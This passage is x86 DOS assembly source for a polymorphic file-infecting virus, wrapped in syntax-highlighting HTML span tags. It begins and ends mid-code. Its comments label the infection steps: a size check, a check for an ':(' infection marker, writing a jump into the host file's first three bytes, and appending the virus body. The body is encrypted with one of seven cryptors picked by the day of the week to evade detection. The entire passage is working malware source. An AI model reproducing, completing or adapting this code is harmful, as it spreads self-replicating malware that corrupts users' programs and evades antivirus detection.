  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">buff</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;load buffer in dx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;go!</span><span class="sc0">

</span><span class="sc1">;------------size check---------------------</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">9Ah</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">63824</span><span class="sc0">        </span><span class="sc1">;size check! no bigger then 63824 bytes</span><span class="sc0">
  </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                  </span><span class="sc1">;    </span><span class="sc0">
    
</span><span class="sc1">;-----------prev infected?----------------------</span><span class="sc0">
</span><span class="sc5">infect_check</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pusha</span><span class="sc0">                         </span><span class="sc1">; i saved registers since i did not take the time</span><span class="sc0">
                                </span><span class="sc1">; to check which registers must be saved</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                  </span><span class="sc1">; set r/w pointer to start of file +1</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                    </span><span class="sc1">; read the jump displacement</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">opbuf</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">opbuf</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">; add 3 to jump displacement to get offset</span><span class="sc0">
                                </span><span class="sc1">; of marker ':('</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                  </span><span class="sc1">; set pointer to marker offset</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                    </span><span class="sc1">; read 2 bytes again</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">opbuf</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">popa</span><span class="sc0">                          </span><span class="sc1">; registers popped here</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">opbuf</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc12">'(:'</span><span class="sc0">  </span><span class="sc1">; check for marker</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                 </span><span class="sc1">; marker found? close file</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">over_opbuf</span><span class="sc0">        </span><span class="sc1">; otherwise proceed</span><span class="sc0">
                

</span><span class="sc5">over_opbuf</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;  mov si,9ah                     ;</span><span class="sc0">
</span><span class="sc1">;  mov ax,word ptr [si]           ;infected?</span><span class="sc0">
</span><span class="sc1">;  sub ax,virus_end - start + 3   ;check it?</span><span class="sc0">
</span><span class="sc1">;  cmp ax,word ptr[bp+buff+1]     ;compare..</span><span class="sc0">
</span><span class="sc1">;  je close_file                  ;already infected? outta here!</span><span class="sc0">

</span><span class="sc1">;----------infect already-------------------</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">three</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                   </span><span class="sc1">;start of file</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;clear</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;cx and dx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;now!</span><span class="sc0">

</span><span class="sc1">;------------write jump----------------------</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">;write the 3 byte jump</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">three</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;load em</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;move em</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;now!</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restc</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;---------write cryptor------------------------------</span><span class="sc0">
  </span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">;end of file</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;clear</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;em</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;now!</span><span class="sc0">

</span><span class="sc1">;---------POLY: cryptor-------------------------------</span><span class="sc0">
                                 </span><span class="sc1">;pick random cryptor from stock of 7</span><span class="sc0">
</span><span class="sc5">poly</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;determine 2nd part of cryptor</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                     </span><span class="sc1">;get day of week</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;now</span><span class="sc0">

</span><span class="sc1">;------find which cryptor to write to infection-----------</span><span class="sc0">
  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">;is it.....sunday</span><span class="sc0">
  </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">                    </span><span class="sc1">;mon</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc0">                    </span><span class="sc1">;tue</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d2</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc0">                    </span><span class="sc1">;wed</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">td4</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">d3</span><span class="sc0">
</span><span class="sc5">td4</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc0">                    </span><span class="sc1">;thur</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">td5</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">d4</span><span class="sc0">
</span><span class="sc5">td5</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc0">                    </span><span class="sc1">;fri</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">td6</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">d5</span><span class="sc0">
</span><span class="sc5">td6</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">d6</span><span class="sc0">

</span><span class="sc1">;-------load the cryptor we need--------------------</span><span class="sc0">
</span><span class="sc5">d0</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;pick and write Zero cryptor</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value0</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">del</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">del1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">del</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">d1</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;pick and write 1st cryptor</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">del1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">del2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">del1</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt1</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">d2</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;pick and write 2nd cryptor</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">del2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">del3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">del2</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt2</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">d3</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;pick and write 3rd cryptor</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">del3</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">del4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">del3</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt3</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">d4</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;pick and write 4th cryptor</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">del4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">del5</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">del4</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt4</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">nope</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
</span><span class="sc5">d5</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;pick and write 5th cryptor</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value5</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">del5</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">del6</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">del5</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt5</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">d6</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value6</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">del6</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">noc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">del6</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt6</span><span class="sc0">
  
</span><span class="sc1">;-------write crypted area--------------------</span><span class="sc0">
</span><span class="sc5">write</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">;write encrypted area</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">virus_end</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;load</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;move</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;now!</span><span class="sc0">

</span><span class="sc5">count</span><span class="sc4">:</span><span class="sc0">                                            
